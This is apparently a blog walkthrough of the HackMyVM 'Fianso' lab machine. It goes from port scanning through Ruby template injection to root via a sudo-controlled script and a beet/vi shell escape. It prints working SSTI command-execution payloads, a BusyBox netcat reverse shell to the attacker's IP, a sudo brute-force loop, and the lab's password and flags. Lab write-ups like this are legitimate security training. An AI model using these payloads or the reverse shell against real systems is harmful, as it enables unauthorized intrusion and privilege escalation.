+++
title = "Fianso - Walkthrough"
date = "2026-08-31"
author = "nvru"
description = "Walkthrough for the Fianso machine."
tags = [
  "ctf",
  "hackmyvm",
  "walkthrough",
  "linux",
  "ssti",
  "ruby",
  "rce",
  "sudo",
  "privilege-escalation",
]
draft = false
+++

# Overview

- **Platform:** HackMyVM
- **Difficulty:** Hard
- **OS:** Linux
- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.9`

The objective was to enumerate the exposed services, exploit a Server-Side Template Injection (SSTI) vulnerability to gain remote code execution, obtain an initial shell as the application user, and abuse a misconfigured sudo configuration to escalate privileges to root.

---

## Enumeration

### Host Discovery

```bash
netdiscover -i vboxnet0 -r 10.10.10.0/24
```

### DNS Setup

```bash
echo "10.10.10.9 fianso.hmv" | sudo tee -a /etc/hosts
```

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.9 -- -sC -sV -A -oN nmap/rust
```

#### Results

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
8000/tcp open  http    WEBrick 1.6.1 (Ruby 2.7.4)
```

The scan identified two open services:

| Port | Service | Version                    |
| ---- | ------- | -------------------------- |
| 22   | SSH     | OpenSSH 8.4p1              |
| 8000 | HTTP    | WEBrick 1.6.1 (Ruby 2.7.4) |

---

### HTTP (8000)

The web application consisted of a simple static page.

![HTTP](/images/hmv/fianso/http.png)

No additional content was exposed through `robots.txt`.

![robots.txt](/images/hmv/fianso/robots.png)

The page also contained a text box that reflected user input directly back to the browser. Since the application was running on Ruby (`WEBrick`), this behavior suggested a possible Server-Side Template Injection (SSTI).

![Possible SSTI](/images/hmv/fianso/maybe_ssti.png)

#### SSTI Verification

Testing with a basic Ruby SSTI payload confirmed that user input was evaluated by the template engine.

```ruby
#{7*7}
```

The application returned `49`, confirming the SSTI vulnerability.

![SSTI](/images/hmv/fianso/ssti.png)

#### SSTI to Remote Code Execution

With SSTI confirmed, arbitrary system commands could be executed.

```ruby
#{ %x|env| }
```

![RCE](/images/hmv/fianso/ssti_rce.png)

Before attempting a reverse shell, I verified that `busybox` was installed on the target.

```ruby
#{ %x|which busybox| }
```

![BusyBox](/images/hmv/fianso/busybox.png)

---

## Initial Access

Using the command execution primitive, I launched a BusyBox reverse shell and obtained a shell as `sofiane`.

```ruby
#{ %x|busybox nc 10.10.10.2 9001 -e /bin/bash| }
```

![Shell as sofiane](/images/hmv/fianso/shell_sofiane.png)

---

## Privilege Escalation

Nothing useful was found while enumerating `sofiane`'s home directory.

Checking the user's sudo permissions revealed something much more interesting: `sofiane` could execute `/bin/bash /opt/harness` as `root`.

![Sudo Permissions](/images/hmv/fianso/sudo_perm.png)

Inspecting `/opt/harness` showed that it was a Bash script. If the correct password was supplied, the script granted `sofiane` passwordless access to `/usr/bin/beet`.

![Harness Script](/images/hmv/fianso/harness.png)

### Calculating the Password Length

Instead of blindly brute-forcing the password with the entire `rockyou.txt` wordlist, I first examined how the script validated the configuration file.

The configuration line had a fixed length of **43 bytes** and followed this format:

```text
fianso:root:<password>
```

The static portion (`fianso:root:`) consumes **12 bytes**.

Subtracting the fixed header from the total length leaves:

```text
43 - 12 = 31
```

Finally, accounting for the newline character at the end of the file:

```text
31 - 1 = 30
```

This meant the password had to be exactly **30 characters** long.

Knowing this drastically reduced the search space, allowing me to create a much smaller custom wordlist instead of testing every password in `rockyou.txt`.

```bash
grep -P '^.{30}$' /opt/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_password
```

The custom list was then tested against the harness script.

```bash
for i in $(cat custom_password); do
    echo "$i" | sudo -u root /bin/bash /opt/harness
done
```

Eventually the correct password was found:

```text
hellnoiamnotgiveyoumypaassword
```

The script successfully updated the sudoers configuration.

![New Sudo Permissions](/images/hmv/fianso/sudo_new_beet.png)

### Root Shell via Beet

Now that `sofiane` could execute `beet` as root without a password, escaping to a root shell was straightforward.

```bash
export EDITOR=vi
sudo -E beet config --edit
```

Inside `vi`:

```vim
:!bash
```

This spawned a root shell.

![Root Shell](/images/hmv/fianso/root_shell.png)

---

# Credentials

```text
Harness Password
----------------
hellnoiamnotgiveyoumypaassword
```

---

## Flags

### User

```text
dd61014e5d119683f9fc798439cd3916
```

### Root

```text
129cf8d39dad02722c0b95ddca3ad73d
```

---

## Attack Path

```text
Host Discovery
    ↓
Port Scan (RustScan / Nmap)
    ↓
HTTP Enumeration
    ↓
Ruby SSTI
    ↓
Remote Code Execution
    ↓
Reverse Shell as sofiane
    ↓
Sudo Enumeration
    ↓
Recover Harness Password
    ↓
Passwordless beet Execution
    ↓
Shell Escape via vi
    ↓
Root Shell
```

---

## References

- [PayloadsAllTheThings – Ruby SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Ruby/#summary)
- [HackTricks – Server-Side Template Injection](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [GTFOBins – vi](https://gtfobins.github.io/gtfobins/vi/)
